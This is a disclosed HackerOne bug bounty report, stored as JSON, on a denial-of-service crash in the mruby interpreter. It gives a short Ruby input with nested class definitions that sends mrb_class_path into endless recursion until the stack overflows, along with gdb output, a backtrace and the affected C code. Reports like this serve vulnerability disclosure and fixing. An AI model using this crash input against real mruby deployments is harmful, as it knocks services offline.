{
  "id": 212456,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTI0NTY=",
  "url": "https://hackerone.com/reports/212456",
  "title": "SIGSEGV - kh_get_n2s - in /src/symbol.c:37",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2017-03-11T02:59:43.724Z",
  "submitted_at": "2017-03-11T02:59:43.724Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mia_",
    "url": "/mia_",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15668,
    "url": "https://hackerone.com/shopify-scripts",
    "handle": "shopify-scripts",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "shopify-scripts",
      "twitter_handle": "",
      "website": "",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-04-27T21:20:29.675Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2017-03-28T21:20:21.461Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The following code triggers the bug\n\n```ruby\nclass<<Proc\nclass P class<<Proc\nclass P class P t end end\nend end end\n```\n\nThis is a Denial of Service bug.\nA similar issue was reported in the past, but is still not fixed.\n\n# Debugger\n\n```gdb\n(gdb) r in/62.txt \nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/externalist/fuzzing/fuzzing_now/mruby_asan in/62.txt\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000414f14 in kh_get_n2s (mrb=mrb@entry=0x602e0001fc60, h=h@entry=0x60080000bfd0, key=key@entry=0)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/symbol.c:37\n37\tKHASH_DEFINE (n2s, mrb_sym, mrb_sym, FALSE, sym_hash_func, sym_hash_equal)\n(gdb) l\n32\t  return h;\n33\t}\n34\t#define sym_hash_equal(mrb,a, b) (mrb->symtbl[a].len == mrb->symtbl[b].len && memcmp(mrb->symtbl[a].name, mrb->symtbl[b].name, mrb->symtbl[a].len) == 0)\n35\t\n36\tKHASH_DECLARE(n2s, mrb_sym, mrb_sym, FALSE)\n37\tKHASH_DEFINE (n2s, mrb_sym, mrb_sym, FALSE, sym_hash_func, sym_hash_equal)\n38\t/* ------------------------------------------------------ */\n39\t\n40\tstatic void\n41\tsym_validate_len(mrb_state *mrb, size_t len)\n```\n\n# Backtrace\n\n```\n(gdb) bt\n#0  0x0000000000414f14 in kh_get_n2s (mrb=mrb@entry=0x602e0001fc60, h=h@entry=0x60080000bfd0, key=key@entry=0)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/symbol.c:37\n#1  0x0000000000415fba in sym_intern (mrb=mrb@entry=0x602e0001fc60, name=name@entry=0x518f80 \"__outer__\", len=len@entry=9, lit=lit@entry=1 '\\001')\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/symbol.c:62\n#2  0x00000000004166ef in mrb_intern_static (mrb=mrb@entry=0x602e0001fc60, name=name@entry=0x518f80 \"__outer__\", len=len@entry=9)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/symbol.c:101\n#3  0x00000000004265bf in mrb_class_outer_module (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:130\n#4  0x0000000000430673 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1583\n#5  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#6  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#7  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#8  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#9  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#10 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#11 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#12 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#13 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#14 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#15 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#16 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#17 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#18 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#19 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n```\n\nFrom here, you can see that it is recursively calling \"mrb_class_path\" indefinitely, until it reaches the stack bottom. When that happens, the program SEGFAULTS.\n\nCode\n```c\nMRB_API mrb_value\nmrb_class_path(mrb_state *mrb, struct RClass *c)\n{\n  mrb_value path;\n  const char *name;\n  mrb_sym classpath = mrb_intern_lit(mrb, \"__classpath__\");\n\n  path = mrb_obj_iv_get(mrb, (struct RObject*)c, classpath);\n  if (mrb_nil_p(path)) {\n    struct RClass *outer = mrb_class_outer_module(mrb, c);\n    mrb_sym sym = mrb_class_sym(mrb, c, outer);\n    mrb_int len;\n\n    if (sym == 0) {\n      return mrb_nil_value();\n    }\n    else if (outer && outer != c && outer != mrb->object_class) {\n      mrb_value base = mrb_class_path(mrb, outer);     // <- It's recursively calling the same function until it reaches the stack bottom.\n      path = mrb_str_buf_new(mrb, 0);\n      if (mrb_nil_p(base)) {\n        mrb_str_cat_lit(mrb, path, \"#<Class:\");\n        mrb_str_concat(mrb, path, mrb_ptr_to_str(mrb, outer));\n        mrb_str_cat_lit(mrb, path, \">\");\n      }\n      else {\n        mrb_str_concat(mrb, path, base);\n      }\n      mrb_str_cat_lit(mrb, path, \"::\");\n      name = mrb_sym2name_len(mrb, sym, &len);\n      mrb_str_cat(mrb, path, name, len);\n    }\n    else {\n      name = mrb_sym2name_len(mrb, sym, &len);\n      path = mrb_str_new(mrb, name, len);\n    }\n    if (!MRB_FROZEN_P(c)) {\n      mrb_obj_iv_set(mrb, (struct RObject*)c, classpath, path);\n    }\n  }\n  return mrb_str_dup(mrb, path);\n}\n```\n\nSince it is not possible to allocate memory below the stack, the exploitability of this bug is low. Hence, a Denial of Service bug.",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-04-27T21:20:21.487Z",
  "allow_singular_disclosure_after": -214499792.3902188,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "eveeez",
    "linkks",
    "spetr0x"
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
